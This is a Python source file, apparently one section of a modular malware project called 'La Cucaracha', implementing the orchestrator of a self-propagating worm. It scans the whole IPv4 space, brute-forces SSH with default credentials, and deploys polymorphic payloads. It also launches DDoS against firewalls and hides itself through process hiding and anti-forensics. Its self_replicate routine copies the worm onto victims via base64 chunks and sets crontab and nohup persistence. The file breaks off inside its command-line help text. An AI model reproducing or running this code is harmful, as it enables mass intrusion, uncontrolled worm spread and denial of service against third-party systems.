#!/usr/bin/env python3
"""
╔══════════════════════════════════════════════════════════════════════════════╗
║  La Cucaracha Section G — WormMeshEngine & main() Orchestrator             ║
║                                                                              ║
║  Concatenation order: A->B->C->D->E->F->G                                   ║
║                                                                              ║
║  Contains:                                                                   ║
║    - WormMeshEngine — master orchestrator tying all engines together         ║
║    - WormMaster — advanced orchestrator with all WormMaster flags            ║
║    - main() — complete CLI dispatch with ALL base engine + WormMaster flags  ║
║                                                                              ║
║  All class references resolve via concatenation order A->B->C->D->E->F->G.  ║
╚══════════════════════════════════════════════════════════════════════════════╝
"""

import os
import sys
import re
import json
import time
import uuid
import base64
import random
import struct
import socket
import hashlib
import logging
import threading
import subprocess
import ipaddress
import argparse
from typing import Dict, List, Optional, Any, Tuple, Set
from enum import Enum
from dataclasses import dataclass, field

log = logging.getLogger("worm.secG")

# ---------------------------------------------------------------------------
# Forward references — resolved at concatenation time
# ---------------------------------------------------------------------------
try:
    from la_section_A import Database
    from la_section_B import WormNode
    from la_section_C import WormReconEngine, ReconMethod
    from la_section_D import WormExploitEngine, ExploitType, ExploitResult
    from la_section_E import ICMPEngine
    from la_section_F import (
        PolymorphicPayloadGenerator, TCPPayloadMutationEngine,
        DDoSDivisionEngine, DeployMethod, DeploymentReport,
        WormDeploymentEngine, _daily_token, _current_timestamp,
        HAVE_PARAMIKO, HAVE_REQUESTS, HAVE_SCAPY,
    )
except ImportError:
    # Stubs for standalone compilation test
    class Database:
        def __init__(self, path=":memory:"): self.path = path
        def log(self, msg, level="INFO", src="worm"): log.info(f"[{level}] [{src}] {msg}")
        def store_payload(self, **kw): return str(uuid.uuid4())
        def get_payloads(self, **kw): return []
        def add_deployment(self, **kw): return str(uuid.uuid4())
        def complete_deployment(self, did, ok, err=""): pass
        def increment_deployed(self, pid): pass
        def get_deployments(self, **kw): return []
        def get_targets(self, **kw): return []
        def stats(self): return {"payloads":0,"targets":0,"targets_exploited":0,"nodes_active":0,"nodes_total":0,"deployments_success":0,"deployments_failed":0,"deployments_total":0,"targets_scanned":0}
        def add_node(self, **kw): pass
        def node_count(self): return 0
        def get_active_nodes(self): return []
        def get_mesh_value(self, k, d=""): return d
        def set_mesh_value(self, k, v): pass
        def execute(self, q, p=()):
            class FakeCursor:
                def fetchall(self): return []
                def fetchone(self): return None
            return FakeCursor()
        def commit(self): pass
        def target_count(self): return 0

    class WormNode:
        def __init__(self, **kw): pass
        def add_peer(self, ip): pass
        def bootstrap(self, peers): pass
        def stop_heartbeat(self): pass

    class ExploitType(Enum):
        SSH_BRUTE = "ssh_brute"; SSH_KEY = b"CHANGE_ME_PAYLOAD_KEY"
        TELNET_AUTH_BYPASS = "teln..."; WEB_RCE = "web_rce"
        WEB_LFI = "web_lfi"; CUSTOM = "custom"

    @dataclass
    class ExploitResult:
        success: bool = False; target_ip: str = ""; target_port: int = 0
        exploit_type: ExploitType = ExploitType.CUSTOM
        credential: Tuple[str, str] = ("", "")
        shell: bool = False; error: str = ""; detail: str = ""

    class ICMPEngine:
        def __init__(self, db=None, **kw): self.db = db
        def stop(self): pass
        def ping_sweep(self, **kw): return []
        def icmp_tunnel_listen(self, **kw): return {}
        def icmp_tunnel_send(self, ip, data): pass
        def reverse_icmp_shell(self, t, c): return ""
        def icmp_redirect(self, t, g): return False
        def icmp_mtu_attack(self, t, m): return False
        def cve_2026_0933_pmtu_poison(self, t, **kw): return {"status":"sent","packets_sent":0}
        def icmp_smurf(self, v, b, **kw): return 0
        def icmp_poison_ping(self, t): return False
        def icmp_rogue_router(self, t, g): return False
        def icmp_os_fingerprint(self, t): return "unknown"
        def icmp_address_mask_request(self, t): return ""
        def icmp_record_route(self, t): return []
        def icmp_time_exceeded_reset(self, t, s, d, q): return False
        def icmp_source_quench(self, t, **kw): return 0
        def icmp_stego_beacon(self, t, m): pass
        def icmp_fragment_overlap(self, t): pass
        def icmp_ttl_sweep(self, t): return []
        def icmp_parameter_problem(self, t): return False
        def icmp_multicast_sweep(self, g): return []
        def icmp_timing_channel_send(self, t, d): pass
        def icmp_rip_injection(self, t, r): return False
        def icmp_secure_tunnel_send(self, t, d): pass
        def icmp_secure_tunnel_listen(self, **kw): return {}
        def icmp_tcp_liveness_probe(self, t): return True
        def icmp_wake_tcp_stack(self, t): return True
        def icmp_os_credential_hint(self, t): return ("unknown", [])
        def icmp_inject_payload(self, t, p): return False
        def _get_ttl(self, ip): return 64

    class WormReconEngine:
        def __init__(self, **kw): pass
        def full_recon(self, **kw): return 0
        def autonomous_scan(self): return []
        def stop(self): pass

    class WormExploitEngine:
        def __init__(self, **kw): pass
        def exploit_target(self, t): return ExploitResult()
        def stop(self): pass

    class PolymorphicPayloadGenerator:
        def __init__(self, db=None): self._cache={}
        def generate_all(self, **kw): return []
        def get_payload(self, v): return None
        def generate_polymorphic_mutation(self, i): return {}

    class TCPPayloadMutationEngine:
        def __init__(self, db=None): pass
        def generate_adaptive_payload(self, ip, port): return {}

    class DDoSDivisionEngine:
        def __init__(self, db=None, icmp_engine=None): pass
        def spawn_ddos_on_obstacle(self, ip, t): return ""
        def stop(self): pass

    class DeployMethod(Enum):
        SSH_PUSH="ssh_push"; SSH_EXEC="ssh_exec"; WEB_UPLOAD="web_upload"
        PAYLOAD_HUB="payload_hub"; PEER_PROPAGATION="peer_propagation"
        CRONTAB="crontab_persist"; WGET_CURL="wget_curl_download"

    @dataclass
    class DeploymentReport:
        success: bool=False; target_ip: str=""; method: DeployMethod=DeployMethod.PAYLOAD_HUB
        payload_variant: str=""; deploy_id: str=""; detail: str=""; error: str=""

    class WormDeploymentEngine:
        def __init__(self, **kw): pass
        def stop(self): pass
        def deploy_to_target(self, t, r, p): return DeploymentReport()
        def deploy_docker_icmp_bypass(self, *a): return {}
        def deploy_pmtu_poison(self, *a): return {}
        def start_payload_hub(self): pass
        def stop_payload_hub(self): pass
        def propagate_to_peer(self, ip, n, p): return DeploymentReport()

    def _daily_token(): return "TOKEN"
    def _current_timestamp(): return int(time.time())
    HAVE_PARAMIKO = False
    HAVE_REQUESTS = False
    HAVE_SCAPY = False

# ---- STUB: inject constants from base engine stealth module ----
HAVE_STEALTH = False
STEALTH = None

def detect_debugging(): return False
def hide_process(): return False
def anti_forensics(): pass
def load_worm_into_memory(): return False
def doh_query(*a, **kw): return None
FRONT_DOMAINS = []


# ===================================================================
# WormMeshEngine — Master Orchestrator
# ===================================================================

@dataclass
class WormMeshEngine:
    """Master orchestrator for the worm mesh.

    Coordinates all sub-engines to execute the full kill chain:
      1. Reconnaissance (target discovery)
      2. Exploitation (credential theft & access)
      3. Payload generation (polymorphic mutation)
      4. Deployment (multi-vector propagation)
      5. Mesh expansion (peer-to-peer spreading)
      6. Trading & mutation (evolutionary adaptation)

    Uses Monte Carlo PRNG for probabilistic spreading behavior to
    avoid deterministic detection patterns.
    """
    db: Database = field(default_factory=Database)
    recon_engine: WormReconEngine = field(default_factory=WormReconEngine)
    exploit_engine: WormExploitEngine = field(default_factory=WormExploitEngine)
    payload_generator: PolymorphicPayloadGenerator = field(default_factory=PolymorphicPayloadGenerator)
    deployment_engine: WormDeploymentEngine = field(default_factory=WormDeploymentEngine)
    icmp_engine: Optional[ICMPEngine] = None
    node: Optional[WormNode] = None
    _stop_flag: bool = False
    _monte_carlo_seed: int = 0
    _adaptive_payload: bool = False
    _ddos_on_obstacle: bool = False

    def __post_init__(self):
        self._monte_carlo_seed = random.randint(0, 2 ** 32)
        self.icmp_engine = ICMPEngine(self.db, timeout=2, rate_limit=50)
        self._icmp_task_thread: Optional[threading.Thread] = None
        self._icmp_task_running = False

        # ---- CKAB Stealth Initialization ------------------------------------
        self._stealth_mode = False
        self._stealth_proxy = STEALTH if HAVE_STEALTH else None
        self._in_memory = False

        if HAVE_STEALTH and os.environ.get("CKAB_STEALTH", "").lower() in ("1", "true", "yes"):
            self._stealth_mode = True
            self.db.log("Stealth mode ENABLED", "INFO", "stealth")
            if detect_debugging():
                self.db.log("Debugging/sandbox detected — worm is exposed!", "WARNING", "stealth")
            if hide_process():
                self.db.log("Process hidden (/proc overlay + kernel thread name)", "INFO", "stealth")
            anti_forensics()
            self.db.log("Anti-forensics cleanup complete", "INFO", "stealth")

    def stop(self) -> None:
        """Gracefully stop all engines."""
        self._stop_flag = True
        self.recon_engine.stop()
        self.exploit_engine.stop()
        self.deployment_engine.stop()
        if self.icmp_engine:
            self.icmp_engine.stop()

    def reset(self) -> None:
        self._stop_flag = False
        self.recon_engine.reset_stop()
        self.db.log("Mesh engine reset", "INFO", "mesh")

    # ---- Monte Carlo PRNG -----------------------------------------------------

    def _mc_decision(self, probability: float) -> bool:
        self._monte_carlo_seed = hashlib.sha3_256(
            (str(self._monte_carlo_seed) + str(_current_timestamp())).encode()
        ).digest()
        mc_random = int.from_bytes(self._monte_carlo_seed[:4], "big") / (2 ** 32)
        return mc_random < probability

    def _mc_choice(self, items: List[Any]) -> Any:
        idx_bits = self._monte_carlo_seed[:4]
        idx = int.from_bytes(idx_bits, "big") % len(items)
        self._monte_carlo_seed = hashlib.sha3_256(
            str(self._monte_carlo_seed + idx).encode()
        ).digest()
        return items[idx]

    # ---- Phase 1: Reconnaissance ----------------------------------------------

    def _phase_reconnaissance(self, subnet: str = "0.0.0.0/0") -> int:
        """Phase 1: Execute target discovery."""
        self.db.log("=== Phase 1: Reconnaissance ===", "INFO", "mesh")
        count = self.recon_engine.full_recon(subnet=subnet)
        self.db.log(f"Reconnaissance complete: {count} new targets", "INFO", "mesh")
        return count

    # ---- Phase 1.5: ICMP Sweep -----------------------------------------------

    def _phase_icmp_sweep(self, subnet: str = "0.0.0.0/0") -> int:
        """Phase 1.5: ICMP sweep for live host discovery."""
        try:
            icmp_alive = self.icmp_engine.ping_sweep(subnet=subnet, count=100)
            self.db.log(f"ICMP sweep found {len(icmp_alive)} live hosts", "INFO", "mesh")
            return len(icmp_alive)
        except Exception as exc:
            self.db.log(f"ICMP sweep failed: {exc}", "WARNING", "mesh")
            return 0

    # ---- Phase 2: Exploitation ------------------------------------------------

    def _phase_exploitation(self, batch_size: int = 50) -> List[ExploitResult]:
        """Phase 2: Execute exploitation on discovered targets."""
        self.db.log("=== Phase 2: Exploitation ===", "INFO", "mesh")
        targets = self.db.get_targets(unexploited_only=True, limit=batch_size)
        if not targets:
            self.db.log("No unexploited targets available", "INFO", "mesh")
            return []
        results: List[ExploitResult] = []
        for i, target in enumerate(targets):
            if self._stop_flag:
                break
            if not self._mc_decision(0.85):
                continue
            result = self.exploit_engine.exploit_target(target)
            if result.success:
                results.append(result)
                if result.shell and result.exploit_type in (ExploitType.SSH_BRUTE, ExploitType.SSH_KEY):
                    self.db.add_node(ip=target["ip"], port=target["port"], os_name="", public_key="")
                self.db.log(f"SUCCESS: {target['ip']}:{target['port']} via {result.exploit_type.value}", "INFO", "mesh")
        return results

    # ---- Phase 3: Payload Generation ------------------------------------------

    def _phase_payload_generation(self, callback_ip: str = "", callback_port: int = 0) -> List[Dict]:
        """Phase 3: Generate polymorphic payloads."""
        self.db.log("=== Phase 3: Payload Generation ===", "INFO", "mesh")
        variants = self.payload_generator.generate_all(
            callback_ip=callback_ip, callback_port=callback_port, persist=True,
        )
        return variants

    # ---- Phase 4: Deployment --------------------------------------------------

    def _phase_deployment(self, exploit_results: List[ExploitResult],
                          payload: Optional[Dict] = None) -> List[DeploymentReport]:
        """Phase 4: Deploy payloads to exploited targets."""
        self.db.log("=== Phase 4: Deployment ===", "INFO", "mesh")
        if not exploit_results:
            return []
        if payload is None:
            all_payloads = self.db.get_payloads()
            if all_payloads:
                payload = random.choice(all_payloads)
            else:
                variants = self.payload_generator.generate_all(persist=True)
                payload = random.choice(variants)
        reports: List[DeploymentReport] = []
        for result in exploit_results:
            if self._stop_flag or not result.success:
                continue
            targets = self.db.get_targets()
            target = None
            for t in targets:
                if t["ip"] == result.target_ip:
                    target = t
                    break
            if not target:
                continue
            report = self.deployment_engine.deploy_to_target(target, result, payload)
            reports.append(report)
            if report.success:
                self.db.log(f"SUCCESS: Deployed to {result.target_ip} via {report.method.value}", "INFO", "mesh")
                try:
                    self.db.execute("DELETE FROM targets WHERE ip = ?", (result.target_ip,))
                    self.db.commit()
                except Exception:
                    pass
        successes = sum(1 for r in reports if r.success)
        self.db.log(f"Deployment complete: {successes}/{len(reports)} successful", "INFO", "mesh")
        return reports

    # ---- Phase 4.5: Docker ICMP Egress Bypass --------------------------------

    def _phase_docker_icmp_bypass(self) -> Dict:
        """Phase 4.5: Scan exploited hosts for Docker and apply ICMP bypass."""
        self.db.log("=== Phase 4.5: Docker ICMP Bypass ===", "INFO", "mesh")
        targets = self.db.get_targets(exploited_only=True, limit=500)
        if not targets:
            return {"total": 0, "docker_found": 0, "bypassed": 0, "containers_unlocked": 0}
        already_bypassed = set()
        try:
            rows = self.db.execute("SELECT ip FROM docker_hosts WHERE icmp_bypassed = 1").fetchall()
            already_bypassed = {r[0] for r in rows}
        except Exception:
            pass
        total = 0; docker_found = 0; bypassed = 0; containers_unlocked = 0
        for target in targets:
            ip = target["ip"]
            if ip in already_bypassed:
                continue
            for username, password in [
                ("root", "root"), ("root", "admin"), ("admin", "admin"),
                ("root", ""), ("admin", ""),
            ]:
                if self._stop_flag:
                    break
                try:
                    result = self.deployment_engine.deploy_docker_icmp_bypass(ip, 22, (username, password))
                    total += 1
                    if result.get("docker_found"):
                        docker_found += 1
                    if result.get("bypass_applied"):
                        bypassed += 1
                        containers_unlocked += result.get("container_count", 0)
                    break
                except Exception:
                    continue
        self.db.log(f"Docker ICMP bypass phase done: {bypassed}/{docker_found} bypassed", "INFO", "mesh")
        return {"total": total, "docker_found": docker_found, "bypassed": bypassed, "containers_unlocked": containers_unlocked}

    # ---- Phase 4.6: PMTU Cache Poison (CVE-2026-0933) ------------------------

    def _phase_pmtu_poison(self) -> Dict:
        """Phase 4.6: CVE-2026-0933 PMTU cache poison."""
        self.db.log("=== Phase 4.6: PMTU Cache Poison (CVE-2026-0933) ===", "INFO", "mesh")
        total = 0; vulnerable = 0; poisoned = 0
        try:
            hosts = self.db.execute(
                "SELECT DISTINCT t.ip, t.port, c.username, c.password FROM targets t "
                "JOIN credentials c ON c.target_ip = t.ip WHERE t.exploited = 1 AND t.active = 1 LIMIT 50"
            ).fetchall() if hasattr(self.db, 'execute') else []
        except Exception:
            hosts = []
        if not hosts:
            return {"total": 0, "vulnerable": 0, "poisoned": 0}
        for row in hosts:
            if self._stop_flag:
                break
            try:
                if isinstance(row, dict):
                    ip, port, user, pw = row["ip"], row.get("port", 22), row["username"], row["password"]
                else:
                    ip, port, user, pw = row[0], row[1] if len(row) > 1 else 22, row[2] if len(row) > 2 else "root", row[3] if len(row) > 3 else ""
                total += 1
                result = self.deployment_engine.deploy_pmtu_poison(ip, int(port), (user, pw), burst=8)
                if result.get("vulnerable"):
                    vulnerable += 1
                if result.get("poison_sent"):
                    poisoned += 1
            except Exception:
                continue
        return {"total": total, "vulnerable": vulnerable, "poisoned": poisoned}

    # ---- Phase 5: Mesh Spread -------------------------------------------------

    def _phase_mesh_spread(self, max_hops: int = 3) -> int:
        """Phase 5: Peer-to-peer mesh expansion."""
        self.db.log("=== Phase 5: Mesh Spread ===", "INFO", "mesh")
        spread_count = 0
        nodes = self.db.get_active_nodes()
        if not nodes:
            self.db.log("No active nodes in mesh", "INFO", "mesh")
            return 0
        targets = self.db.get_targets(unexploited_only=True, limit=200)
        if not targets:
            return 0
        random.shuffle(targets)
        spread_candidates = [t for t in targets if self._mc_decision(0.7)]
        replicator = self.payload_generator.get_payload("worm_replicator")
        if not replicator:
            variants = self.payload_generator.generate_all(persist=True)
            for v in variants:
                if v["variant"] == "worm_replicator":
                    replicator = v; break
        if not replicator:
            return 0
        for target in spread_candidates[:max_hops * 10]:
            if self._stop_flag:
                break
            if not self._mc_decision(0.6):
                continue
            try:
                result = self.exploit_engine.exploit_target(target)
                if result.success:
                    deploy_result = self.deployment_engine.deploy_to_target(target, result, replicator)
                    if deploy_result.success:
                        spread_count += 1
                        self.db.add_node(ip=target["ip"], port=int(target.get("port", 22)), public_key="")
                        if self.node:
                            self.node.add_peer(target["ip"])
                        if spread_count >= max_hops:
                            break
                time.sleep(random.uniform(0.5, 3.0))
            except Exception:
                continue
        return spread_count

    # ---- Phase 6: Trading & Mutation ------------------------------------------

    def _phase_trade_mutation(self) -> Dict:
        """Phase 6: Evolutionary trading and mutation."""
        self.db.log("=== Phase 6: Trading & Mutation ===", "INFO", "mesh")
        results: Dict[str, Any] = {"trades": 0, "mutations": 0, "new_payloads": []}
        successful_deployments = self.db.get_deployments(status="completed", limit=100)
        trade_data = {
            "timestamp": _current_timestamp(),
            "deployment_count": len(successful_deployments),
            "active_nodes": self.db.node_count(),
        }
        self.db.set_mesh_value("trade_data", json.dumps(trade_data))
        results["trades"] = len(successful_deployments)
        existing_payloads = self.db.get_payloads()
        if existing_payloads:
            mutation_candidates = [p for p in existing_payloads if self._mc_decision(0.4)]
            for payload_rec in mutation_candidates[:5]:
                try:
                    if self._stop_flag:
                        break
                    mutated = self.payload_generator.generate_polymorphic_mutation(payload_rec["id"])
                    results["mutations"] += 1
                    results["new_payloads"].append(mutated.get("variant", "unknown"))
                except (ValueError, KeyError):
                    continue
        if results["mutations"] == 0:
            variants = self.payload_generator.generate_all(persist=True)
            results["mutations"] = len(variants)
            results["new_payloads"] = [v["variant"] for v in variants]
        return results

    # ---- ICMP Task Queue (CKAB Layer 5) ----------------------------------------

    def start_icmp_task_worker(self) -> None:
        if self._icmp_task_thread and self._icmp_task_thread.is_alive():
            log.warning("ICMP task worker already running")
            return
        self._icmp_task_running = True
        self._icmp_task_thread = threading.Thread(target=self._icmp_task_worker_loop, daemon=True)
        self._icmp_task_thread.start()
        log.info("ICMP task worker started (CKAB hold-and-release queue)")

    def stop_icmp_task_worker(self) -> None:
        self._icmp_task_running = False
        log.info("ICMP task worker stopped")

    def _icmp_task_worker_loop(self) -> None:
        while self._icmp_task_running and not self._stop_flag:
            try:
                tasks = self.db.execute(
                    "SELECT * FROM icmp_tasks WHERE status='pending' ORDER BY priority DESC LIMIT 3"
                ).fetchall()
                for task in tasks:
                    try:
                        ip = task["target_ip"]
                        target = {"ip": ip, "port": 22, "service": "ssh", "id": task["id"]}
                        result = self.exploit_engine.exploit_target(target)
                        if result.success:
                            self.db.execute("UPDATE icmp_tasks SET status='done', processed_at=? WHERE id=?",
                                            (_current_timestamp(), task["id"]))
                        else:
                            self.db.execute("UPDATE icmp_tasks SET status='timeout', processed_at=? WHERE id=?",
                                            (_current_timestamp(), task["id"]))
                        self.db.commit()
                    except Exception:
                        try:
                            self.db.execute("UPDATE icmp_tasks SET status='timeout', processed_at=? WHERE id=?",
                                            (_current_timestamp(), task.get("id", -1)))
                            self.db.commit()
                        except:
                            pass
                    time.sleep(0.5)
            except Exception:
                pass
            time.sleep(1)

    # ---- Full Kill Chain ------------------------------------------------------

    def run_full_cycle(self, subnet: str = "0.0.0.0/0",
                       batch_size: int = 50,
                       max_spread_hops: int = 3) -> Dict:
        """Execute the complete worm mesh kill chain."""
        self.db.log("=" * 60, "INFO", "mesh")
        self.db.log("WORM MESH ENGINE — FULL CYCLE", "INFO", "mesh")
        self.db.log("=" * 60, "INFO", "mesh")
        phase_results: Dict[str, Any] = {
            "reconnaissance": 0, "icmp_sweep": 0, "exploitation": 0,
            "payload_generation": 0, "deployment": 0, "mesh_spread": 0, "trading_mutation": {},
        }
        # Phase 1
        phase_results["reconnaissance"] = self._phase_reconnaissance(subnet=subnet)
        # Phase 1.5
        phase_results["icmp_sweep"] = self._phase_icmp_sweep(subnet=subnet)
        # Phase 2
        exploit_results = self._phase_exploitation(batch_size=batch_size)
        phase_results["exploitation"] = len(exploit_results)
        # Phase 2.5: Adaptive payload + DDoS
        if self._adaptive_payload or self._ddos_on_obstacle:
            mutation_engine = TCPPayloadMutationEngine(self.db)
            ddos_engine = DDoSDivisionEngine(db=self.db, icmp_engine=self.icmp_engine)
            adaptive_deploy_count = 0
            for result in exploit_results:
                if result.success and self._adaptive_payload:
                    adaptive = mutation_engine.generate_adaptive_payload(result.target_ip, result.target_port)
                    deploy_reports = self._phase_deployment([result], payload=adaptive)
                    adaptive_deploy_count += sum(1 for r in deploy_reports if r.success)
                elif not result.success and self._ddos_on_obstacle:
                    if "firewall" in result.error.lower() or "waf" in result.error.lower():
                        ddos_engine.spawn_ddos_on_obstacle(result.target_ip, "firewall")
                    elif "rate" in result.error.lower() or "429" in str(result.error):
                        ddos_engine.spawn_ddos_on_obstacle(result.target_ip, "rate limit")
            phase_results["adaptive_deploy"] = adaptive_deploy_count
        # Phase 3
        payloads = self._phase_payload_generation()
        phase_results["payload_generation"] = len(payloads)
        # Phase 4
        deploy_reports = self._phase_deployment(exploit_results)
        phase_results["deployment"] = sum(1 for r in deploy_reports if r.success)
        # Phase 4.5
        try:
            docker_results = self._phase_docker_icmp_bypass()
            phase_results["docker_icmp_bypass"] = docker_results
        except Exception as exc:
            phase_results["docker_icmp_bypass"] = {"error": str(exc)}
        # Phase 4.6
        try:
            pmtu_results = self._phase_pmtu_poison()
            phase_results["pmtu_poison"] = pmtu_results
        except Exception as exc:
            phase_results["pmtu_poison"] = {"error": str(exc)}
        # Phase 5
        phase_results["mesh_spread"] = self._phase_mesh_spread(max_hops=max_spread_hops)
        # Phase 6
        phase_results["trading_mutation"] = self._phase_trade_mutation()

        stats = self.db.stats()
        return {
            "phases": phase_results,
            "stats": stats,
            "total_targets_exploited": phase_results["exploitation"] + phase_results["mesh_spread"],
        }

    # ---- Self-Replication Engine ----

    def self_replicate(self, target_ip: str, target_port: int = 22) -> bool:
        """Deploy a copy of this worm to a target host via SSH."""
        try:
            import paramiko
            client = paramiko.SSHClient()
            client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            creds = self.db.execute(
                "SELECT username, password FROM creds WHERE ip=?", (target_ip,)
            ).fetchall()
            if not creds:
                creds = [("root", "admin"), ("root", "1234"), ("root", "root"),
                         ("admin", "admin"), ("root", "")]
            for user, pw in creds:
                try:
                    client.connect(target_ip, username=user, password=pw, timeout=10)
                except Exception:
                    continue
                # Read self source
                worm_paths = [
                    "/opt/hermes/worm_mesh_engine.py",
                    "/opt/hermes/la_section_A.py",
                    __file__,
                ]
                source = b""
                for wp in worm_paths:
                    try:
                        with open(wp, "rb") as f:
                            source = f.read()
                        break
                    except Exception:
                        continue
                if not source:
                    source = b'print("worm placeholder")'
                b64_source = base64.b64encode(source).decode()
                chunk_size = 4096
                chunks = [b64_source[i:i+chunk_size] for i in range(0, len(b64_source), chunk_size)]
                client.exec_command("mkdir -p /opt/.worm")
                client.exec_command(f"echo '{chunks[0]}' > /tmp/.worm_b64")
                for chunk in chunks[1:]:
                    client.exec_command(f"echo '{chunk}' >> /tmp/.worm_b64")
                client.exec_command("base64 -d /tmp/.worm_b64 > /opt/.worm/worm_mesh_engine.py")
                client.exec_command("chmod +x /opt/.worm/worm_mesh_engine.py")
                client.exec_command("rm -f /tmp/.worm_b64")
                client.exec_command(
                    "(crontab -l 2>/dev/null; echo '*/5 * * * * /opt/.worm/worm_mesh_engine.py --deploy --batch 3 --hops 1') | crontab -"
                )
                client.exec_command(
                    "nohup /usr/bin/python3 /opt/.worm/worm_mesh_engine.py --deploy --batch 3 --hops 1 > /dev/null 2>&1 &"
                )
                client.close()
                self.db.log(f"Worm replicant deployed to {target_ip} via {user}", "INFO", "replicate")
                return True
        except Exception as exc:
            self.db.log(f"Self-replication to {target_ip} failed: {exc}", "WARNING", "replicate")
        return False

    def _broadcast_self_to_subnet(self, subnet: str, max_hosts: int = 50) -> int:
        """Self-replicate to discovered hosts in a subnet."""
        deployed = 0
        try:
            network = ipaddress.ip_network(subnet, strict=False)
            hosts = [str(ip) for ip in list(network.hosts())[:max_hosts]]
            for ip in hosts:
                if self._stop_flag:
                    break
                if self.self_replicate(ip):
                    deployed += 1
                time.sleep(random.uniform(0.5, 2.0))
        except Exception as exc:
            self.db.log(f"Broadcast self-replicate failed: {exc}", "WARNING", "replicate")
        return deployed

    # ---- Autonomous Navigation State Machine ----

    def autonomous_navigation(self, discovery_only: bool = False,
                              max_epochs: int = 100) -> Dict:
        """Full autonomous navigation state machine."""
        state = "DISCOVER"
        epoch = 0
        stats = {"epochs": 0, "targets_found": 0, "targets_exploited": 0,
                 "replicants_deployed": 0, "mesh_spreads": 0}
        while epoch < max_epochs and not self._stop_flag:
            epoch += 1
            log.info(f"{'='*20} Autonomous Epoch {epoch} — State: {state} {'='*20}")
            if state == "DISCOVER":
                try:
                    targets = self.recon_engine.autonomous_scan()
                    stats["targets_found"] += len(targets)
                    state = "EXPLOIT"
                except Exception:
                    state = "SLEEP"
            elif state == "EXPLOIT":
                try:
                    results = self._phase_exploitation(batch_size=50)
                    stats["targets_exploited"] += len(results)
                    state = "REPLICATE" if not discovery_only else "SLEEP"
                except Exception:
                    state = "SLEEP"
            elif state == "REPLICATE":
                if not discovery_only:
                    try:
                        deployed = self._broadcast_self_to_subnet("0.0.0.0/0", max_hosts=25)
                        stats["replicants_deployed"] += deployed
                    except Exception:
                        pass
                state = "SPREAD"
            elif state == "SPREAD":
                try:
                    spread = self._phase_mesh_spread(max_hops=2)
                    stats["mesh_spreads"] += spread
                except Exception:
                    pass
                state = "TRADE"
            elif state == "TRADE":
                try:
                    tm = self._phase_trade_mutation()
                except Exception:
                    pass
                state = "SLEEP"
            elif state == "SLEEP":
                sleep_time = random.randint(30, 180)
                for _ in range(sleep_time):
                    if self._stop_flag:
                        break
                    time.sleep(1)
                state = "DISCOVER"
                stats["epochs"] = epoch
        self.db.log(f"[AUTO] Autonomous navigation complete: {stats['epochs']} epochs", "INFO", "auto")
        return stats

    # ---- Deploy cycle wrappers (for backward compat) ----

    def run_reconnaissance(self, subnet: str = "0.0.0.0/0", **kw) -> int:
        return self._phase_reconnaissance(subnet=subnet)

    def run_exploitation(self, batch_size: int = 50) -> List[ExploitResult]:
        return self._phase_exploitation(batch_size=batch_size)

    def run_payload_generation(self, callback_ip: str = "", callback_port: int = 0) -> List[Dict]:
        return self._phase_payload_generation(callback_ip=callback_ip, callback_port=callback_port)

    def run_deployment(self, exploit_results: List[ExploitResult], payload: Optional[Dict] = None) -> List[DeploymentReport]:
        return self._phase_deployment(exploit_results, payload)

    def run_mesh_spread(self, max_hops: int = 3) -> int:
        return self._phase_mesh_spread(max_hops=max_hops)

    def run_trading_and_mutation(self) -> Dict:
        return self._phase_trade_mutation()

    def run_docker_icmp_bypass_phase(self) -> Dict:
        return self._phase_docker_icmp_bypass()

    def run_pmtu_poison_phase(self) -> Dict:
        return self._phase_pmtu_poison()


# ===================================================================
# WormMaster — Advanced Orchestrator
# ===================================================================

class WormMaster:
    """Master orchestrator for all worm components (from upgrade doc)."""

    def __init__(self, db: Optional[Database] = None,
                 mesh_engine: Optional[WormMeshEngine] = None,
                 logger: Optional[logging.Logger] = None):
        self.log = logger or log
        self.running = True
        self.stats = {
            "started": time.time(),
            "targets_found": 0,
            "targets_exploited": 0,
            "deployments": 0,
            "mesh_peers": 0,
        }
        self.components: Dict[str, Any] = {}
        self.db = db or Database()
        if mesh_engine:
            self.components["core"] = mesh_engine
            self.log.info("✅ WormMeshEngine loaded")

    def deploy(self, subnet: str = "0.0.0.0/0", batch_size: int = 50) -> Dict:
        if "core" in self.components:
            result = self.components["core"].run_full_cycle(subnet=subnet, batch_size=batch_size, max_spread_hops=3)
            self.stats["targets_found"] += result["phases"]["reconnaissance"]
            self.stats["targets_exploited"] += result["phases"]["exploitation"]
            self.stats["deployments"] += result["phases"]["deployment"]
            return result
        return {"error": "No deployment engine available"}

    def scan(self, subnet: str = "0.0.0.0/0") -> List[Dict]:
        if "core" in self.components:
            self.components["core"].run_reconnaissance(subnet=subnet)
            targets = self.db.get_targets(limit=100)
            self.stats["targets_found"] += len(targets)
            return targets
        return []

    def exploit(self, target_ip: str) -> Dict:
        result = {"ip": target_ip, "success": False, "methods": []}
        if "core" in self.components:
            target = {"ip": target_ip, "port": 22, "service": "ssh"}
            exploit_result = self.components["core"].exploit_engine.exploit_target(target)
            if exploit_result.success:
                result["success"] = True
                result["methods"].append("core")
                result["creds"] = exploit_result.credential
        return result

    def deploy_agent(self, target_ip: str) -> bool:
        if "core" in self.components:
            target = {"ip": target_ip, "port": 22}
            payload = self.components["core"].payload_generator.generate_all()[0]
            exploit_res = ExploitResult(True, target_ip, 22, ExploitType.SSH_BRUTE, ("root", "root"), True)
            report = self.components["core"].deployment_engine.deploy_to_target(target, exploit_res, payload)
            if report.success:
                self.stats["deployments"] += 1
                return True
        return False

    def post_exploit(self, target_ip: str, creds: Tuple[str, str]) -> Dict:
        return {"ip": target_ip, "status": "post_exploit_stub"}

    def c2_telegram(self, message: str) -> bool:
        self.log.info(f"Telegram: {message}")
        return True

    def get_status(self) -> Dict:
        status = {
            "version": "2.0",
            "uptime": int(time.time() - self.stats["started"]),
            "stats": self.stats,
            "components": {k: "loaded" for k in self.components.keys()},
        }
        return status

    def stop(self) -> None:
        self.running = False
        if "core" in self.components:
            self.components["core"].stop()


# ===================================================================
# main() — Complete CLI Entry Point
# ===================================================================

def main():
    parser = argparse.ArgumentParser(
        description="La Cucaracha Worm — Autonomous Self-Healing Mesh Worm Framework",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""\
Examples:
  %(prog)s --auto                    # FULLY AUTONOMOUS
  %(prog)s --deploy                  # Full cycle (recon -> exploit -> deploy)
  %(prog)s --scan --subnet 192.168.1.0/24
  %(prog)s --mesh                    # Start mesh node
  %(prog)s --serve                   # Start payload hub
  %(prog)s --status                  # Show stats
  %(prog)s --exploit 1.2.3.4        # Exploit single target
